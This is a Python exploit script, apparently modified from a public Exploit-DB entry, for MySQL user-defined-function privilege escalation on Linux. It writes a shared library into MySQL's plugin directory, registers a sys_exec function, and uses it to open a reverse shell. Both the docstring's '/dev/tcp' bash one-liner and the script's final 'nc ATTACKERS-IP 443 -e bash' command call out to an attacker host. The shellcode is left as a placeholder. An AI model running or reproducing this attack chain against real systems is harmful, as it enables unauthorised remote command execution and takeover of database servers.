#!/usr/bin/env python3

# Exploit Title: MySQL User-Defined (Linux) x32 / x86_64 sys_exec function local privilege escalation exploit
# Date: 24/01/2019
# Original Exploit Author: d7x
# Modified to execute a RevTCP @ target IP
# Vendor Homepage: https://www.mysql.com
# Software Link: www.mysql.com
# Version: MySQL 4.x/5.x
# Tested on: Debian GNU/Linux 8.11 / mysql  Ver 14.14 Distrib 5.5.60, for debian-linux-gnu (x86_64) using readline 6.3
# CVE : N/A

'''
*** MySQL User-Defined (Linux) x32 / x86_64 sys_exec function local privilege escalation exploit ***


UDF lib shellcodes retrieved from metasploit
(there are windows .dll libraries within metasploit as well so this could be easily ported to Windows)

Based on the famous raptor_udf.c by Marco Ivaldi (EDB ID: 1518)
CVE: N/A
References:
https://dev.mysql.com/doc/refman/5.5/en/create-function-udf.html
https://www.exploit-db.com/exploits/1518
https://www.exploit-db.com/papers/44139/ - MySQL UDF Exploitation by Osanda Malith Jayathissa (@OsandaMalith)

Tested on 3.16.0-6-amd64 #1 SMP Debian 3.16.57-2 (2018-07-14) x86_64 GNU/Linux

@d7x_real
https://d7x.promiselabs.net
https://www.promiselabs.net

@p4yl0ad
https://github.com/p4yl0ad
https://twitter.com/p4yl0ad


#p4yl0ad
SQL PSEUDOCODE / SQL exec commands (Manual)
select @@plugin_dir
select binary 0xshellcode into dumpfile @@plugin_dir;
create function sys_exec returns int soname udf_filename;
select * from mysql.func where name='sys_exec' \G
select sys_exec('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')
'''

import sys
import subprocess
import platform, random
import argparse
import os
import re
import pty

#Makefile
#
#gcc -Wall -I/usr/include/mariadb/server -I/usr/include/mariadb/ -I/usr/include/mariadb/server/private -I. -shared lib_mysqludf_sys.c -o /usr/lib/lib_mysqludf_sys.so
#xxd -p lib_mysqludf_sys.so | tr -d '\n' > lib_mysqludf_sys.so.hex
#cat lib_mysqludf_sys.so.hex | xclip 
#copy pasta ze output

shellcode_x64 = 'insert shellc here'


# MySQL username and password: make sure you have FILE privileges and mysql is actually running as root
username='root'
password='REDACTED'

plugin_dir_ = "/home/dev/plugin/"
udf_filename = 'udf' + str(random.randint(1000,10000)) + '.so'
udf_outfile = plugin_dir_ + udf_filename

print("creating udf file for you gamer")
os.system('mysql --host=REMOTE_TARGET -u root -p\'' + password + '\' -e "select binary 0x' + shellcode_x64 + ' into dumpfile \'%s\' \G"' % udf_outfile)

print("creating exec function pogchamp")
os.system('mysql --host=REMOTE_TARGET -u root -p\'' + password + '\' -e "create function sys_exec returns int soname \'%s\'\G"' % udf_filename)

print("Triggerrrrrrrrrred like a sjw lmao")
os.system('mysql --host=REMOTE_TARGET -u root -p\'' + password + '\' -e "select sys_exec(\'nc ATTACKERS-IP 443 -e bash 0>&1\')"')
